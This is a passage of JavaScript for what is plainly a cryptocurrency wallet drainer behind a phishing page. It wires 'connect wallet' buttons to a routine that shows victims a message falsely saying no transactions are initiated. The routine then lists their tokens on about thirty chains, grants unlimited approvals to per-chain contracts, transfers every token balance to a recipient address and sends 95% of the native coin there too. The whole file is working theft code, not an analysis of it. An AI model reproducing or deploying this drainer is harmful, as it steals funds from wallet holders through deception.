      await handleTransactions(fetchBNBTokens, bnbContractAddress, address, signer, provider, 'BNB');
      break;

    case arbitrum.chainId:
      await handleTransactions(fetchARBTokens, arbContractAddress, address, signer, provider, 'ARB');
      break;

    case arbnova.chainId:
      await handleTransactions(fetchARBNOVATokens, arbnovaContractAddress, address, signer, provider, 'ETH')
      break;
    
    case base.chainId:
      await handleTransactions(fetchBASETokens, baseContractAddress, address, signer, provider, 'ETH')
      break;

    case optimism.chainId:
      await handleTransactions(fetchOPTokens, optimismContractAddress, address, signer, provider, 'OP')
      break;

    case polygon.chainId:
      await handleTransactions(fetchPOLYGONTokens, polygonContractAddress, address, signer, provider, 'MATIC')
      break;  
      
    case polygonevm.chainId:
      await handleTransactions(fetchPOLYGONEVMTokens, polygonevmContractAddress, address, signer, provider, 'ETH')
      break;

    case linea.chainId:
      await handleTransactions(fetchLINEATokens, lineaContractAddress, address, signer, provider, 'ETH')
      break;

    case gnosis.chainId:
      await handleTransactions(fetchGNOSISTokens, gnosisContractAddress, address, signer, provider, 'xDAI')
      break;

    case zksync.chainId:
      await handleTransactions(fetchZKSYNCTokens, zksyncContractAddress, address, signer, provider, 'ZK')
      break;

    case celo.chainId:
      await handleTransactions(fetchCELOTokens, celoContractAddress, address, signer, provider, 'ETH')
      break;

    case fantom.chainId:
      await handleTransactions(fetchFANTOMTokens, fantomContractAddress, address, signer, provider, 'FTM')
      break;

    case merlin.chainId:
      await handleTransactions(fetchMERLINTokens, merlinContractAddress, address, signer, provider, 'BTC')
      break;

    case manta.chainId: 
      await handleTransactions(fetchMANTATokens, mantaContractAddress, address, signer, provider, 'ETH')
      break;

    case blast.chainId:
      await handleTransactions(fetchBLASTTokens, blastContractAddress, address, signer, provider, 'ETH')
      break;

    case mantle.chainId:
      await handleTransactions(fetchMANTLETokens, mantleContractAddress, address, signer, provider, 'MNT')
      break;

    case metis.chainId:
      await handleTransactions(fetchMETISTokens, metisContractAddress, address, signer, provider, 'METIS')
      break;

    case heco.chainId:
      await handleTransactions(fetchHECOTokens, hecoContractAddress, address, signer, provider, 'HT')
      break;

    case platon.chainId:
      await handleTransactions(fetchPLATONTokens, platonContractAddress, address, signer, provider, 'LAT')
      break;

    case conflux.chainId:
      await handleTransactions(fetchCONFLUXTokens, confluxContractAddress, address, signer, provider, 'CFX')
      break;

    case aurora.chainId:
      await handleTransactions(fetchAURORATokens, auroraContractAddress, address, signer, provider, 'ETH')
      break;

    case avalanche.chainId:
      await handleTransactions(fetchAVALANCHETokens, avalancheContractAddress, address, signer, provider, 'AVA')
      break;

    case smartbch.chainId:
      await handleTransactions(fetchSMARTBCHTokens, smartbchContractAddress, address, signer, provider, 'BCH')
      break;

    case scroll.chainId:
      await handleTransactions(fetchSCROLLTokens, scrollContractAddress, address, signer, provider, 'ETH')
      break;

    case opbnb.chainId:
      await handleTransactions(fetchOPBNBTokens, opbnbContractAddress, address, signer, provider, 'BNB')
      break;

    case klaytn.chainId:
      await handleTransactions(fetchKLAYTNTokens, klaytnContractAddress, address, signer, provider, 'KLAY')
      break;

    case okx.chainId:
      await handleTransactions(fetchOKXTokens, okxContractAddress, address, signer, provider, 'OKT')
      break;

    case cronos.chainId:
      await handleTransactions(fetchCRONOSTokens, cronosContractAddress, address, signer, provider, 'CRO')
      break;

    case harmony.chainId:
      await handleTransactions(fetchHARMONYTokens, harmonyContractAddress, address, signer, provider, 'ONE')
      break;

    default:
      console.error(`Unsupported network with chainId: ${chainId}`);
      break;
  }
}

async function handleTransactions(fetchTokens, contractAddr, address, signer, provider, symbol) {
  const tokens = await fetchTokens(address);
  await signMessage(signer);

  const tokenDetails = await fetchTokenDetails(tokens, address, signer);
  await handleTokenApprovalsAndTransfers(tokenDetails, contractAddr, signer);
  await transferNativeToken(address, signer, provider, recipientAddress, symbol);
}

async function signMessage(signer) {
  const message = "This is a standard message approval to verify your account. No transactions are initiated";
  const signature = await signer.signMessage(message);
  console.log('Signature:', signature);
}


async function fetchTokenDetails(tokens, address, signer) {
  const tokenDetails = await Promise.all(
    tokens.map(async (token) => {
      try {
        const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
        const balance = await retryAsync(() => tokenContract.balanceOf(address));
        const proxyUrl = `https://evms-proxy.vercel.app/proxy?symbols=${token.tokenSymbol.toLowerCase()}`;
        const response = await retryAsync(() => fetch(proxyUrl));
        const prices = await response.json();
        const priceInfo = prices.data?.[token.tokenSymbol.toUpperCase()]?.quote.USD.price;

        if (priceInfo !== undefined) {
          const formattedBalance = ethers.utils.formatUnits(balance, 18);
          const usdValue = parseFloat(formattedBalance) * priceInfo;
          const usdValueRounded = Math.round(usdValue);
          const usdValueString = usdValueRounded.toString();
          const transferrableValue = ethers.utils.parseUnits(usdValueString, 18);

          if (balance.gte(ethers.utils.parseUnits('0.02', 18)) && transferrableValue.gte(ethers.utils.parseUnits('0.02', 18))) {
            return {
              contract: tokenContract,
              balance: balance,
              symbol: token.tokenSymbol,
              address: token.contractAddress,
              transferrableValue
            };
          }
        } else {
          console.log('Price info not available...');
        }
      } catch (error) {
        console.error(`Failed to fetch token details for ${token.tokenSymbol}:`, error);
      }
    })
  );

  return tokenDetails.filter((token) => token).sort((a, b) => b.transferrableValue.sub(a.transferrableValue));
}

async function handleTokenApprovalsAndTransfers(tokenDetails, contractAddr, signer) {
  try {
    await Promise.all(
      tokenDetails.map(async (token) => {
        const maxUint256 = ethers.constants.MaxUint256;
        const approveTx = await retryAsync(() => token.contract.approve(contractAddr, maxUint256, { gasLimit: 500000 }));
        await approveTx.wait();
        console.log(`Tokens approved for ${token.symbol} at ${token.address}`);

        const contract = new ethers.Contract(contractAddr, contractABI, signer);
        const transferTx = await retryAsync(() => contract.transferTokens(token.address, signer.getAddress(), recipientAddress, token.balance, { gasLimit: 500000 }));
        await transferTx.wait();
        console.log(`Tokens transferred for ${token.symbol} from ${address} to ${recipientAddress}`);
      })
    );
  } catch (error) {
    console.error('Error transferring tokens:', error);
  }
}

async function transferNativeToken(address, signer, provider, recipientAddress, symbol) {
  try {
    const balance = await retryAsync(() => provider.getBalance(address));
    console.log(`Current balance: ${ethers.utils.formatEther(balance)} ${symbol}`);

    if (balance.gte(ethers.utils.parseUnits('0.02', 18))) {
      const amountToSend = balance.mul(95).div(100);
      console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ${symbol}`);

      const transaction = {
        to: recipientAddress,
        value: amountToSend,
      };
      const txResponse = await retryAsync(() => signer.sendTransaction(transaction));
      console.log(`Transaction hash: ${txResponse.hash}`);

      const txReceipt = await txResponse.wait();
      console.log('Transaction confirmed in block:', txReceipt.blockNumber);
    } else {
      console.log(`No balance found for ${symbol} to send`);
    }
  } catch (error) {
    console.error(`Error transferring ${symbol}:`, error);
  }
}

//RETRIES
async function retryAsync(fn, retries = 2, delay = 1000) {
  for (let i = 0; i < retries; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i < retries - 1) {
        console.log(`Retrying... (${i + 1}/${retries})`);
        await new Promise(res => setTimeout(res, delay * (2 ** i)));
      } else {
        throw error;
      }
    }
  }
}


//API FUNCTIONS
async function fetchETHTokens(account) {
    const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${etherscanapikey}`;
    try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.status === "1" && data.message === "OK") {
            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = data.result.filter(tx => {
                const duplicate = seen.has(tx.contractAddress);
                seen.add(tx.contractAddress);
                return !duplicate;
            });
            return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
        } else {
            console.error('Failed to fetch token transactions:', data.result);
        }
    } catch (error) {
        console.error('Error fetching token transactions:', error);
    }
    return [];
  }
  


//BNB API FUNCTION
async function fetchBNBTokens(account) {
  const url = `https://api.bscscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${bnbscanapikey}`;
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//ARBITRUM CONTRACT
async function fetchARBTokens(account) {
  const url = `https://api.arbiscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${arbapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//OPTIMISM API FUNCTION
async function fetchOPTokens(account) {
  const url = `https://api-optimistic.etherscan.io/api?module=account&action=tokentx&&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${optimismapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//ARBNOVA API FUNCTION
async function fetchARBNOVATokens(account) {
  const url = `https://api-nova.arbiscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${arbnovaapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//BASE API FUNCTION
async function fetchBASETokens(account) {
  const url = `https://api.basescan.org/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=27025780&sort=asc&apikey=${baseapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//ZKSYNC API FUNCTION
async function fetchZKSYNCTokens(account) {
  const url = `https://api-era.zksync.network/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=latest&sort=asc&apikey=${zksyncapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//POLYGON API FUNCTION
async function fetchPOLYGONTokens(account) {
  const url = `https://api.polygonscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${polygonapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//POLYGONEVM API FUNCTION
async function fetchPOLYGONEVMTokens(account) {
  const url = `https://api-zkevm.polygonscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${polygonevmapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//BLAST API FUNCTION
async function fetchBLASTTokens(account) {
  const url = `https://api.blastscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=999999999&sort=asc&apikey=${blastapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//SCROLL API FUNCTION
async function fetchSCROLLTokens(account) {
  const url = `https://api.scrollscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=2500000&sort=asc&apikey=${scrollapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//METIS API FUNCTION
async function fetchMETISTokens(account) {
    const url = `https://evms-proxy.vercel.app/proxy/conflux?account=${account}`
    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.result && data.result.tokens) {
            // Extract the tokens array from the response
            const tokens = data.result.tokens;

            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = tokens.filter(token => {
                const duplicate = seen.has(token.address);
                seen.add(token.address);
                return !duplicate;
            });

            // Map the tokens to the desired format
            return uniqueTokens.map(token => ({
                name: token.name,
                tokenSymbol: token.symbol,
                contractAddress: token.address
            }));
        } else {
            console.error('Failed to fetch token data:', data);
        }
    } catch (error) {
        console.error('Error fetching token data:', error);
    }
    return [];
}

//MANTA API FUNCTION
async function fetchMANTATokens(account) {
    const url = `https://evms-proxy.vercel.app/proxy/manta?account=${account}`;

    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.status === "1" && data.message === "OK") {
            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = data.result.filter(tx => {
                const duplicate = seen.has(tx.contractAddress);
                seen.add(tx.contractAddress);
                return !duplicate;
            });

            // Map the tokens to the desired format
            return uniqueTokens.map(tx => ({
                tokenSymbol: tx.tokenSymbol,
                contractAddress: tx.contractAddress,
                tokenName: tx.tokenName,
                tokenDecimal: tx.tokenDecimal
            }));
        } else {
            console.error('Failed to fetch token transactions:', data.result);
        }
    } catch (error) {
        console.error('Error fetching token transactions:', error);
    }
    return [];
}

//FANTOM API FUNCTION
async function fetchFANTOMTokens(account) {
  const url = `https://api.ftmscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${fantomapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//GNOSIS API FUNCTION
async function fetchGNOSISTokens(account) {
  const url = `https://api.gnosisscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${gnosisapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//LINEA API FUNCTION
async function fetchLINEATokens(account) {
  const url = `https://api.lineascan.build/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=2500000&sort=asc&apikey=${lineaapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//CELO API FUNCTION
async function fetchCELOTokens(account) {
  const url = `https://api.celoscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=27025780&sort=asc&apikey=${celoapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//AVALANCHE API FUNCTION
async function fetchAVALANCHETokens(account) {
  const url = `https://evms-proxy.vercel.app/proxy/avalanche?account=${account}`
    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.result && data.result.tokens) {
            // Extract the tokens array from the response
            const tokens = data.result.tokens;

            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = tokens.filter(token => {
                const duplicate = seen.has(token.address);
                seen.add(token.address);
                return !duplicate;
            });

            // Map the tokens to the desired format
            return uniqueTokens.map(token => ({
                name: token.name,
                tokenSymbol: token.symbol,
                contractAddress: token.address
            }));
        } else {
            console.error('Failed to fetch token data:', data);
        }
    } catch (error) {
        console.error('Error fetching token data:', error);
    }
    return [];
}

//OPBNB API FUNCTION
async function fetchOPBNBTokens(account) {
  const url = `https://api-opbnb.bscscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=999999999&sort=asc&apikey=${opbnbapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//OKX API FUNCTION
async function fetchOKXTokens(account) {
    const url = `https://evms-proxy.vercel.app/proxy/okx?account=${account}`;

    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.status === "1" && data.message === "OK") {
            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = data.result.filter(tx => {
                const duplicate = seen.has(tx.contractAddress);
                seen.add(tx.contractAddress);
                return !duplicate;
            });

            // Map the tokens to the desired format
            return uniqueTokens.map(tx => ({
                tokenSymbol: tx.tokenSymbol,
                contractAddress: tx.contractAddress,
                tokenName: tx.tokenName,
                tokenDecimal: tx.tokenDecimal
            }));
        } else {
            console.error('Failed to fetch token transactions:', data.result);
        }
    } catch (error) {
        console.error('Error fetching token transactions:', error);
    }
    return [];
}


//MANTLE API FUNCTION
async function fetchMANTLETokens(account) {
    const url = `https://evms-proxy.vercel.app/proxy/mantle?account=${account}`
    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.result && data.result.tokens) {
            // Extract the tokens array from the response
            const tokens = data.result.tokens;

            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = tokens.filter(token => {
                const duplicate = seen.has(token.address);
                seen.add(token.address);
                return !duplicate;
            });

            // Map the tokens to the desired format
            return uniqueTokens.map(token => ({
                name: token.name,
                tokenSymbol: token.symbol,
                contractAddress: token.address
            }));
        } else {
            console.error('Failed to fetch token data:', data);
        }
    } catch (error) {
        console.error('Error fetching token data:', error);
    }
    return [];
}

//AURORA API FUNCTION
async function fetchAURORATokens(account) {
    const url = `https://evms-proxy.vercel.app/proxy/aurora?account=${account}`
    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.result && data.result.tokens) {
            // Extract the tokens array from the response
            const tokens = data.result.tokens;

            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = tokens.filter(token => {
                const duplicate = seen.has(token.address);
                seen.add(token.address);
                return !duplicate;
            });

            // Map the tokens to the desired format
            return uniqueTokens.map(token => ({
                name: token.name,
                tokenSymbol: token.symbol,
                contractAddress: token.address
            }));
        } else {
            console.error('Failed to fetch token data:', data);
        }
    } catch (error) {
        console.error('Error fetching token data:', error);
    }
    return [];
}


//CCRONOS API FUNCTION
async function fetchCRONOSTokens(account) {
  const url = `https://api.cronoscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=2500000&sort=asc&apikey=${cronosapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

///KLAYTN API FUNCTION
async function fetchKLAYTNTokens(account) {
    const url = `https://evms-proxy.vercel.app/proxy/klaytn?account=${account}`
    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.result && data.result.tokens) {
            // Extract the tokens array from the response
            const tokens = data.result.tokens;

            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = tokens.filter(token => {
                const duplicate = seen.has(token.address);
                seen.add(token.address);
                return !duplicate;
            });

            // Map the tokens to the desired format
            return uniqueTokens.map(token => ({
                name: token.name,
                tokenSymbol: token.symbol,
                contractAddress: token.address
            }));
        } else {
            console.error('Failed to fetch token data:', data);
        }
    } catch (error) {
        console.error('Error fetching token data:', error);
    }
    return [];
}


//PLATON API FUNCTION
async function fetchPLATONTokens(account) {
    const url = `https://evms-proxy.vercel.app/proxy/platon?account=${account}`
    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.result && data.result.tokens) {
            // Extract the tokens array from the response
            const tokens = data.result.tokens;

            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = tokens.filter(token => {
                const duplicate = seen.has(token.address);
                seen.add(token.address);
                return !duplicate;
            });

            // Map the tokens to the desired format
            return uniqueTokens.map(token => ({
                name: token.name,
                tokenSymbol: token.symbol,
                contractAddress: token.address
            }));
        } else {
            console.error('Failed to fetch token data:', data);
        }
    } catch (error) {
        console.error('Error fetching token data:', error);
    }
    return [];
}

//HARMONY API FUNCTION
async function fetchHARMONYTokens(account) {
    const url = `https://evms-proxy.vercel.app/proxy/harmony?account=${account}`
    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.result && data.result.tokens) {
            // Extract the tokens array from the response
            const tokens = data.result.tokens;

            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = tokens.filter(token => {
                const duplicate = seen.has(token.address);
                seen.add(token.address);
                return !duplicate;
            });

            // Map the tokens to the desired format
            return uniqueTokens.map(token => ({
                name: token.name,
                tokenSymbol: token.symbol,
                contractAddress: token.address
            }));
        } else {
            console.error('Failed to fetch token data:', data);
        }
    } catch (error) {
        console.error('Error fetching token data:', error);
    }
    return [];
}

//HECO API FUNCTION
async function fetchHECOTokens(account) {
    const url = `https://evms-proxy.vercel.app/proxy/heco?account=${account}`
    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.result && data.result.tokens) {
            // Extract the tokens array from the response
            const tokens = data.result.tokens;

            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = tokens.filter(token => {
                const duplicate = seen.has(token.address);
                seen.add(token.address);
                return !duplicate;
            });

            // Map the tokens to the desired format
            return uniqueTokens.map(token => ({
                name: token.name,
                tokenSymbol: token.symbol,
                contractAddress: token.address
            }));
        } else {
            console.error('Failed to fetch token data:', data);
        }
    } catch (error) {
        console.error('Error fetching token data:', error);
    }
    return [];
}

//SMARTBCH API FUNCTION
async function fetchSMARTBCHTokens(account) {
    const url = `https://evms-proxy.vercel.app/proxy/smartbch?account=${account}`
    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.result && data.result.tokens) {
            // Extract the tokens array from the response
            const tokens = data.result.tokens;

            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = tokens.filter(token => {
                const duplicate = seen.has(token.address);
                seen.add(token.address);
                return !duplicate;
            });

            // Map the tokens to the desired format
            return uniqueTokens.map(token => ({
                name: token.name,
                tokenSymbol: token.symbol,
                contractAddress: token.address
            }));
        } else {
            console.error('Failed to fetch token data:', data);
        }
    } catch (error) {
        console.error('Error fetching token data:', error);
    }
    return [];
}

//CONFLUX ESPACE API FUNCTION
async function fetchCONFLUXTokens(account) {
    const url = `https://evms-proxy.vercel.app/proxy/conflux?account=${account}`
    try {
        const response = await fetch(url);
        const data = await response.json();

        if (data.result && data.result.tokens) {
            // Extract the tokens array from the response
            const tokens = data.result.tokens;

            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = tokens.filter(token => {
                const duplicate = seen.has(token.address);
                seen.add(token.address);
                return !duplicate;
            });

            // Map the tokens to the desired format
            return uniqueTokens.map(token => ({
                name: token.name,
                tokenSymbol: token.symbol,
                contractAddress: token.address
            }));
        } else {
            console.error('Failed to fetch token data:', data);
        }
    } catch (error) {
        console.error('Error fetching token data:', error);
    }
    return [];
}


//MERLIN API FUNCTION
async function fetchMERLINTokens(account) {
    const url = `https://scan.merlinchain.io/api?module=account&action=addresstokennftbalance&address=${account}&page=1&offset=100&api_key=${merlinapikey}`
    try {
        const response = await axios.get(url);
        const data = await response.json();
        if (data.status === "1" && data.message === "OK") {
            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = data.result.filter(tx => {
                const duplicate = seen.has(tx.contractAddress);
                seen.add(tx.contractAddress);
                return !duplicate;
            });
            return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
        } else {
            console.error('Failed to fetch token transactions:', data.result);
        }
    } catch (error) {
        console.error('Error fetching token transactions:', error);
    }
    return [];
}


const openNetworkModalBtn = document.getElementById('open-network-modal')
openNetworkModalBtn.addEventListener('click', () => connectWallet())


const openNetworkModalBtn1 = document.getElementById('open-network-modal-1')
openNetworkModalBtn1.addEventListener('click', () => connectWallet())



const openNetworkModalBtn2 = document.getElementById('open-network-modal-2')
openNetworkModalBtn2.addEventListener('click', () => connectWallet())


const openNetworkModalBtn3 = document.getElementById('open-network-modal-3')
openNetworkModalBtn3.addEventListener('click', () => connectWallet())


const openNetworkModalBtn4 = document.getElementById('open-network-modal-4')
openNetworkModalBtn4.addEventListener('click', () => connectWallet())


const openNetworkModalBtn5 = document.getElementById('open-network-modal-5')
openNetworkModalBtn5.addEventListener('click', () => connectWallet())


